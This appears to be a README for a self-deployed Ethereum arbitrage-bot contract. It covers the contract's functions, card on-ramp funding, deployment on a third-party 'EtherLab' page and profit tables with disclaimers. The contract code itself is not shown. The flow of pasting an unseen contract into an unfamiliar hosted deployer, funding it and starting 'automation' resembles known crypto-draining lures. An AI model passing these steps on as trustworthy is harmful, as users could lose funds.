# Arbitrage Bot with Built-in Python Automation

An arbitrage bot is a smart contract that searches for and executes price gaps between pools and routers. It can hold **ETH** and major ERC-20s (**WETH, USDT, USDC, WBTC**, plus any token you whitelist). Below is a step-by-step guide to deploy your own instance and run it without a single manual swap.

## What the bot is

An arbitrage bot is a smart contract plus an external automation script that drives it.

- **`executeArbitrage()`** — main function: runs a multi-leg path across allowed routers in one transaction (ETH or token in).
- **`executeArbitrageFromBalance()`** — owner-only: same as above, but spends the **contract’s own balance** (how a funded bot actually trades).
- **`quickSwap()` / `quickSwapFromBalance()`** — one-hop swap through the default Uniswap V3 router.
- **`setRouterAllowed()` / `setTokenAllowed()`** — whitelist routers and tokens (ETH/WETH, stables, BTC wrappers, or anything else you add).
- **`setDefaultFee()` / `setDefaultTokenOut()`** — pool fee and default output token (USDT by default).
- **`setMinQuickSwapAmount()` / `setMaxQuickSwapAmount()`** — optional size rails for quick swaps (defaults: 0.001–100 ETH equivalent).
- **`setPaused()`** — emergency pause.
- **`revokeApproval()`** — zero a token allowance.
- **`depositEth()`** — payable deposit; also accepts plain ETH via `receive()`. Card deposits are off-chain (buy crypto, then call this).
- **`withdraw()` / `withdrawETH()` / `emergencyWithdrawAll()`** — owner pull of tokens, ETH, or everything.
- **`getBalance()` / `getOwner()` / `owner()`** — read helpers.

Only the **owner** (the wallet that deployed the contract) can change settings and withdraw. Deploy **your own** instance. Do not share one contract across users.

## Supported assets

| Asset | Role |
| --- | --- |
| ETH (native) | Gas + trading inventory |
| WETH | Uniswap path start/end |
| USDT / USDC | Default stables (whitelist USDC if you want it) |
| WBTC | Optional — whitelist before use |
| Any ERC-20 | `setTokenAllowed(token, true)` |

There is **no minimum deposit**. Fund **any amount** you are willing to risk. Keep a little extra ETH on the **deployer wallet** for gas.

## Fund with a debit or credit card (fiat → crypto)

**Short answer:** yes, you can fund the bot from a debit or credit card — but the card never talks to the smart contract. A licensed **on-ramp** charges the card, sends you ETH/USDC/USDT, and **you** deposit that crypto into the bot.

| Step | What happens | Who does it |
| --- | --- | --- |
| 1 | You pay USD/EUR/etc. with Visa, Mastercard, or a debit card | MoonPay, Transak, Ramp, Coinbase, MetaMask Buy, your exchange |
| 2 | On-ramp KYCs you (first time) and converts fiat → crypto | The on-ramp, not this repo |
| 3 | ETH or a stablecoin lands in **your wallet** | Your MetaMask / Coinbase wallet |
| 4 | You send that crypto to **your** bot contract | Plain ETH transfer, `depositEth()`, or an ERC-20 transfer |

The contract only understands ETH and ERC-20s. There is no `depositWithCard()` on-chain, and there never should be: card networks, chargebacks, and PCI rules live off-chain.

### Recommended path (buy to your wallet, then deposit)

This is the path that actually works. Many on-ramps **refuse contract addresses** as the destination because they are not a normal wallet you control.

1. Deploy the bot with the **same** MetaMask account that will own it (see steps below).
2. In MetaMask, open that account → **Buy** / **Buy crypto**.
3. Pick **ETH** (for gas + inventory) or **USDC / USDT** (stable inventory). Pay with debit or credit card.
4. Wait until the crypto shows in MetaMask. Card buys are not instant on-chain; the on-ramp settles, then sends a transaction.
5. Send ETH to the bot: paste the contract address in MetaMask and transfer, or call `depositEth()`.
6. Or send USDC/USDT/WETH/WBTC as a normal token transfer to the same contract address (token must be allowed — USDT/USDC/WETH/WBTC already are).
7. Keep a little extra ETH on the **owner wallet** so automation can pay gas.

**Do not** type card numbers into EtherLab, this repo, a Telegram “support” chat, or any page that claims the bot will charge your card directly. Those are scams.

### Consumer on-ramps (you are the customer, not a merchant)

You do **not** need Stripe, a merchant account, or this project to process cards. You buy crypto as a consumer:

- [MetaMask Buy](https://support.metamask.io/manage-crypto/buy/how-to-buy-crypto-in-metamask/) — in-wallet; uses MoonPay / Transak / similar depending on country
- [Coinbase](https://www.coinbase.com/) — buy ETH/USDC, withdraw to MetaMask, then to the bot
- [MoonPay](https://www.moonpay.com/buy) — card → ETH/USDC to a wallet you specify
- [Transak](https://transak.com/) — same idea; availability varies by country
- [Ramp](https://ramp.network/) — same idea

Region, KYC, and card brand (debit is often easier than credit) decide which one lets you through. Credit cards are declined more often because issuers treat crypto buys as cash-like.

### Fees, limits, and timing (expect this)

- Card on-ramps typically take **about 2.5–7%** all-in (fee + spread). Bank transfer / ACH is cheaper if the provider offers it.
- First purchase: identity check (photo ID). Limits stay small until that clears.
- Settlement: minutes to a few hours, not a single MetaMask confirmation.
- Network: buy **Ethereum mainnet** ETH/USDC if that is where you deployed. Sending Solana USDC or “exchange ETH” on the wrong network will lose funds.

A **$100** card spend might credit **~$93–97** of ETH after on-ramp fees. Size the deposit after those fees, not before.

### Why this project will not take card numbers

- **PCI-DSS** — storing or keying cards in a webpage we ship would make this repo a payment processor.
- **Chargebacks** — a card payment can be reversed weeks later; an on-chain deposit cannot. On-ramps underwrite that. A Solidity contract cannot.
- **Licensing** — converting other people’s card payments into crypto is a money-transmitter / VASP business, not a function you add to `contract.sol`.
- **Self-custody** — this bot is owner-only. A shared “pay with card, we mint you a share” flow would be pooling funds, which the contract is explicitly not designed for.

If you later want a **hosted widget** (MoonPay/Transak embedded next to the contract address), that still uses *their* checkout and *your* on-ramp API key. It does not put a card form in the contract. See [docs/CARD_ONRAMP.md](docs/CARD_ONRAMP.md) for the exact buy-then-deposit checklist.

## Step-by-step guide

### 1. Open the deployer page

![EtherLab](https://i.ibb.co/PzMH74XW/1.png)

Open [etherlab website](https://etherlab-onchain.github.io/Etherlab/) (or your hosted copy) in the browser.

### 2. Create the bot file

Create a new `.sol` file (e.g. `contract.sol`) and paste [contract.sol](contract.sol).

![EtherLab](https://i.ibb.co/nN90b2FP/2.png)

### 3. Compile the bot

**Compiler** tab → version **0.8.20** → Compile.

![Compiling the contract](https://i.ibb.co/vCmJHMGz/3.png)

### 4. Deploy and fund the bot

**Deploy** tab → connect MetaMask (or another EVM wallet) → Deploy. The contract address appears below.

**Fund it however you want:**

- Send **any amount of ETH** to the contract (plain transfer or `depositEth()`).
- Or transfer allowed ERC-20s (WETH, USDT, …) to the same address.
- **Debit / credit card:** you cannot pay the contract with a card. Buy crypto with the card first (see [Fund with a debit or credit card](#fund-with-a-debit-or-credit-card-fiat--crypto)), then send that ETH or token to the bot.
- Suggested first test: **0.05–0.2 ETH** so you can see gas vs. fill quality without oversizing.
- There is **no 0.5–1 ETH requirement**. Size is yours.

Keep ETH on the **owner wallet** as well — automation txs are paid by the owner, not only by the contract.

![Deploying the contract](https://i.ibb.co/39grWTjG/4.png)

### 5. Start the bot via automation

**Python Automation** tab → confirm the contract is selected → **Start** → confirm in the wallet.

Leave the page open while it runs.

![Starting via automation](https://i.ibb.co/sdLXkqYW/6.png) ![Starting via automation](https://i.ibb.co/hRdRQYhw/7.png)

## What happens after clicking Start

![Starting via automation](https://i.ibb.co/mrw0zT9S/8.png) ![Starting via automation](https://i.ibb.co/spHXSCpW/528.png)

- Each interval, the script dry-runs `executeArbitrage` / `executeArbitrageFromBalance` (`eth_estimateGas`). If it would succeed, a real tx is sent (one wallet confirmation).
- Other selected functions are estimated only.
- A scanner can log Uniswap V2/V3 swaps (who, direction, size).
- Activity shows in **Logs**.

## About profit (worked numbers, not a promise)

Arbitrage is **spread minus gas minus competition**. Nothing here is guaranteed. Days with no edge are normal.

Assumptions used for the table (illustrative only, mainnet-style):

- ETH marked at **$3,000** (round number; live price will differ).
- A “captured” round-trip after pool fees: **0.08%–0.25%** of notional (typical leftover after 5–30 bps of pool fees if a gap still exists).
- Gas per successful attempt: **~$8–$40** depending on congestion.
- Many estimated calls **revert** (no edge) and cost **$0** if you only send when `estimateGas` succeeds.

| Contract inventory | Notional marked | 3 fills/day at 0.10% | Gas (3 fills) | Rough net / day |
| --- | --- | --- | --- | --- |
| 0.05 ETH | $150 | ~$0.45 | ~$24–$120 | often **negative** after gas |
| 0.2 ETH | $600 | ~$1.80 | ~$24–$120 | often **negative** after gas |
| 1 ETH | $3,000 | ~$9 | ~$24–$120 | small / often **flat to down** |
| 5 ETH | $15,000 | ~$45 | ~$24–$120 | **tens of USD** on a good day |
| 20 ETH | $60,000 | ~$180 | ~$24–$120 | **low hundreds** only if fills actually hit |

A **$500 / day** figure on **1 ETH** would require ~**16.7% of inventory per day** after gas. That is **not** a realistic average for public Uniswap arb; professionals with colocation still fight over basis points. Treat any “$500 a day” claim as marketing, not a forecast.

**What is realistic:**

- Small deposits mainly **learn the loop** (deploy, fund, pause, withdraw).
- Profit, when it exists, scales with **inventory** and **how often a true cross-pool gap lasts longer than your inclusion time**.
- Volatility helps; crowded, cheap-gas periods help less than people expect.
- You can withdraw **anytime** via `withdrawETH` / `withdraw` / `emergencyWithdrawAll`.

Results are **not guaranteed** and can be a loss. Only deposit what you can afford to lose. This software is self-custody infrastructure, not an investment product.
